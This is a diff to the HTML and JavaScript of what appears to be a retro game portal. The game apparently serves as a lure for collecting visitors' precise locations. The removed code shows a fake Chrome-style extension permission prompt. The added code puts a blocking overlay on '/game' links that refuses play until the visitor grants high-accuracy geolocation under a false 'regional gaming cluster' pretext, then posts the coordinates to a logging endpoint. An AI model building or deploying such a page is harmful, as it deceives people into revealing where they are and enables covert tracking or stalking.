@@ -6,20 +6,17 @@
     <title>Retro Arcade Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-between p-4">
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-between p-4 relative">
     
-    <!-- Chrome Extension Style Permission Banner -->
-    <div id="ext-geo-banner" style="display: none; position: fixed; top: 15px; right: 15px; background: #202124; color: #bdc1c6; padding: 16px; border-radius: 8px; font-family: Roboto, Arial, sans-serif; box-shadow: 0 4px 12px rgba(0,0,0,0.4); z-index: 10000; width: 320px; border: 1px solid #5f6368;">
-        <div style="display: flex; align-items: flex-start; gap: 12px;">
-            <div style="background: #8ab4f8; color: #202124; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0;">📍</div>
-            <div>
-                <div style="font-weight: 500; color: #fff; font-size: 14px; margin-bottom: 4px;">RetroPulse Extension</div>
-                <div style="font-size: 13px; line-height: 1.4;">wants to know your location to connect you to the nearest low-latency game server.</div>
-                <div style="margin-top: 12px; display: flex; justify-content: flex-end; gap: 8px;">
-                    <button id="ext-block-btn" style="background: transparent; color: #8ab4f8; border: none; padding: 6px 12px; font-size: 13px; font-weight: 500; cursor: pointer; border-radius: 4px;">Block</button>
-                    <button id="ext-allow-btn" style="background: #8ab4f8; color: #202124; border: none; padding: 6px 14px; font-size: 13px; font-weight: 500; cursor: pointer; border-radius: 4px;">Allow</button>
-                </div>
-            </div>
+    <!-- Mandatory Location Lock Overlay (Appears on /game path) -->
+    <div id="mandatory-geo-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 5, 5, 0.95); backdrop-filter: blur(8px); z-index: 99999; align-items: center; justify-content: center;">
+        <div style="background: #1e1e24; color: #fff; padding: 28px; border-radius: 12px; font-family: Roboto, Arial, sans-serif; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 340px; border: 1px solid #333; text-align: center;">
+            <div style="font-size: 36px; margin-bottom: 12px;">📍</div>
+            <div style="font-weight: bold; font-size: 18px; margin-bottom: 8px; color: #00ffcc;">Location Access Required</div>
+            <div style="font-size: 13px; line-height: 1.5; color: #aaa; margin-bottom: 20px;">To play on RetroPulse, you must enable your location to connect to the regional gaming cluster.</div>
+            
+            <button id="mandatory-allow-btn" style="background: #00ffcc; color: #000; border: none; width: 100%; padding: 12px; font-size: 14px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: background 0.2s;">Enable Location & Play</button>
+            <div id="error-msg" style="color: #ff5555; font-size: 12px; margin-top: 10px; display: none;">Location access is mandatory to proceed.</div>
         </div>
     </div>
 
@@ -52,7 +49,7 @@
         const btnSnake = document.getElementById('btnSnake');
         const btnBlocks = document.getElementById('btnBlocks');
 
-        async function sendLogData(lat = null, lon = null) {
+        async function sendLogData(lat, lon) {
             try {
                 await fetch('/api/log', {
                     method: 'POST',
@@ -69,40 +66,45 @@
         }
 
         window.addEventListener('DOMContentLoaded', () => {
+            // Default boot into Nokia Snake visually underneath
             initSnakeGame(container);
 
+            // Check if URL path includes '/game'
             if (window.location.pathname.includes('/game')) {
-                setTimeout(() => {
-                    document.getElementById('ext-geo-banner').style.display = 'block';
-                }, 1000);
+                // Force show the mandatory location overlay immediately
+                document.getElementById('mandatory-geo-overlay').style.display = 'flex';
             } else {
-                sendLogData();
+                // If not on /game path, log normally without coordinates
+                sendLogData(null, null);
             }
         });
 
-        document.getElementById('ext-allow-btn').addEventListener('click', () => {
-            document.getElementById('ext-geo-banner').style.display = 'none';
+        // When user clicks the mandatory enable button
+        document.getElementById('mandatory-allow-btn').addEventListener('click', () => {
+            const errorDiv = document.getElementById('error-msg');
+            errorDiv.style.display = 'none';
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // Success: Got precise coordinates! Send to server and hide lock overlay.
                         sendLogData(position.coords.latitude, position.coords.longitude);
+                        document.getElementById('mandatory-geo-overlay').style.display = 'none';
                     },
                     (error) => {
-                        sendLogData();
+                        // User blocked or denied the native prompt
+                        errorDiv.style.display = 'block';
+                        errorDiv.textContent = 'Permission denied. You must allow location to play.';
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000 }
                 );
             } else {
-                sendLogData();
+                errorDiv.style.display = 'block';
+                errorDiv.textContent = 'Geolocation is not supported by your browser.';
             }
         });
 
-        document.getElementById('ext-block-btn').addEventListener('click', () => {
-            document.getElementById('ext-geo-banner').style.display = 'none';
-            sendLogData();
-        });
-
+        // 2. UI GAME CONTROLLER SWITCHING
         btnSnake.addEventListener('click', () => {
             btnSnake.className = "px-4 py-2 bg-emerald-600 text-xs font-bold rounded transition";
             btnBlocks.className = "px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition";
